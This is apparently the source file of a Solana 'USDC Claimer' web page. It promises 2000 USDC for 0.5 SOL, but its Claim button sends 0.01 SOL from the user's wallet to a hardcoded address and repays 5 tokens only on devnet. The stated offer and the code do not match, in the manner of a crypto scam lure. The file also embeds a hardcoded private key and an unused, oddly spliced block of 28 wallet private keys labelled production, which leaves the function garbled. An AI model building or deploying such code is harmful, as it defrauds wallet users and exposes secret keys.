/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "41wLYTbekr2QjnDwgcTY24P2c6G74AwpedD1a58qzuv1chQm5t5pF9jsQw6CAKSFVd36jwXU2xygrzdNpxKn8stb"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "owv4Aa62vTvmp62hNh6mTMV5u1Y9KznYZV5a1c2MkSURWC54gmrCkpHaC4X9vpYXy7A8oyLz1GrL8NVGF8jqboK",
  "key1": "5YNdz3wsPE6QADhGD3TNvBcqt2nLWWXqRc7WyHYiGZdu5ahAPrXryMcYTDQzb17A9ffrE5E6QhiQNYHDCsKYNRqd",
  "key2": "uxfghvA82yQUzY21jsocY7LtnA8ujSwMPHa4wo8AEYroBeDfqs9yWqmD5GmQfs3ML5ppeuJahi3hMKpoMcW7Re1",
  "key3": "XHKjwkoJ6iSJoDnKn7L7oKkLjpYf4gZZpjdBtjijGMWxyud6Q5gP5YErQgoZeMmgvrNhZkHCBZrExEuLk9Y1bES",
  "key4": "2mUZmLWPzxtpzbLKe63MKgnfhfKjrjKsKPPJqbXz8cLbpFZKVuB2rxpCdHiFD2ns7sHHkUWcdBT45K1xzYqMTZDk",
  "key5": "4fee2awQvCCpu243EyBRSoKbKF3htguSh1DABn7SFF8ZuzUjkaPnpG64iNYgN8iTjKzRmtAM5dLKS59oTwfa2fmr",
  "key6": "3rvW27TmkgzdLXRqtaJbSixgAZerDAhYYhi9hQqXYJXruTiT1t97b5ULuQ5fCuSSDy8oPauAgHyU4hA5B5TSdze4",
  "key7": "3Gj8c7yhUYQSeC1sWQj7o2igySuncrJAhnKLL7Am86jstZcPggn1N2odsskvqVDq6AwMp3p6dSVNaGpPKrrc4ZfU",
  "key8": "3vMjCJ2GVwgZiAucLJe1bh1poqM2vcxrvUJ81GHJwvFWvJfWYvUXxdiUKwBAcQP4p3vKxzvwv6Hnk2PRvWkTJ2GE",
  "key9": "N7vRuFysRvozqqXwuBwEwaYEUYH7N8LQxY1CagZgNsDrSapBAcLzLrfFq6ZmyFbHPXUNoXr2wksUgdFL9Z9bqwR",
  "key10": "2pzzUr8m2yPFzuebwWTTc1B1zU4k16WXXhx9dbkgBQ3551oHpefAtF7BaFTAATq4rDff8Dc76hiWS8dEVTCBqJhq",
  "key11": "47dtBYFy2YfyWBC9jwUsjAo5HCKrgD544A4hHvTHTH5Qqk3Nk7Nfso1iD3WvBXEFydTDykG2U9QcyRr3CvtKYFhi",
  "key12": "51CyqTudV5wH4zZfDevEyt5BQsf271TB114UAoaMxUxnPmp75yYLn5GydGJuB29mkZz3NqmKwW1Dmt9EMbBKprqB",
  "key13": "KNhHsxiyH9fiDWw7nGci62LwszZTPXYiH3HJJ5Eoonk6de5TzXs8VmPuNPgFCqh9yiPgZnwhAgxx3pvvPhtDyUE",
  "key14": "3LcMnb37hncvWxd6rLfybz3U3fSMwQz2nRFHSZkSVmwsHVX8hQgtEt7oLX6JJQiXfiK2EVhNNcaz3jaXBG9SedgY",
  "key15": "2zQskD6mApU1ZxD2eWCJZ27pKJ4tCXqdMfuKRXdFGTq9VXrsEBcggErcESEbvhBTJyMhGi4rqn9xYYang1xtKLXv",
  "key16": "3LBpZeTkia7njyR82gzCPSCgwskjRKFUQj2h6FnNoa7SMocruZWmU7oibnJszeJurdWrD1AcWYmLuJhoqxo8Vmia",
  "key17": "4FgJHez1zJF5MJbufUwKeYHrJKnDn7ThYtCGREN1S29bVTgewFgTLcAECAxCeArRmkPRZthCukb6ND7TYk1MWDin",
  "key18": "4XqtoF2Ktu7X1Wir1XCX7fGEKzrVwFXCyVTPtvMmowbBuxDrqkgyr8sMdRy7u9w4Cj1eJQaAL5yDnN4zjUcyrCrT",
  "key19": "2SirQkFrRy12XqV4jRMDWEZTJSnGCFnch72CS4W5wtNZLaZzg7ScL1y5rJ2YQaWBx2Qsr7QdJQWDUm8Ayr5ip8GM",
  "key20": "V9zvrfHU3NgGWXJQ4Z46CohxndEtjpSZft4Vraw2QtgsLrRQ2XzAURiv2JRuvhD8AbkT3usvkrELaXzscF8HK1X",
  "key21": "5K6U5MhCR6PMe5ViuFRdvRFAy5WN3XX7gok7HF66Uo8GSjVEMdmiMvF8z3vPdvAdR1EjtQ6RcNuwBatA1wVPadmk",
  "key22": "3sC8FtcYyWyyWvxqYZLkbcuVfhS5988Q5bP5XQhSJpes6xkD6ChRFaHsZsB1ShB2uqFNAqtdRBiiVuKSbkJBXjZL",
  "key23": "34A8wtQHZsByw8hBXHTaGKsNHZLU8Fx6hYVngynC7edM3r7UWEq3X4EVGoZXezaJ457ig1EqUJQ2ZiRqv8HDzFqm",
  "key24": "57twjtAL6xHWezwNmZkvsAidFkcKEdoNvwieRedtVD63cBXAkMbtntPuKZpHa5wTXYJFaWvBuRPRdvazkhvN2WAy",
  "key25": "GNbG3VEDADg4EFDQpC6JKPcXhGyaVASRtxu828gWUAWyMtF8WGFqfMtpdkG6EHYgMNomARbbKj4qDhK3uRFVewc",
  "key26": "49BBUdayqN9cMt69S9cc9s3mPzjYFGCYtbnPduMAG4zUuKrsjJCvf7z6j4gZxuewofWLebWtd8egrrgexMjgApGU",
  "key27": "5pPx2yYMJsr7tesMyBjAr1F6X9bUK8bwdthCrWXkZdWAR8xsPbQ818GKUbuMCrgccL5DiebVkTagu526qJmkt1AM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
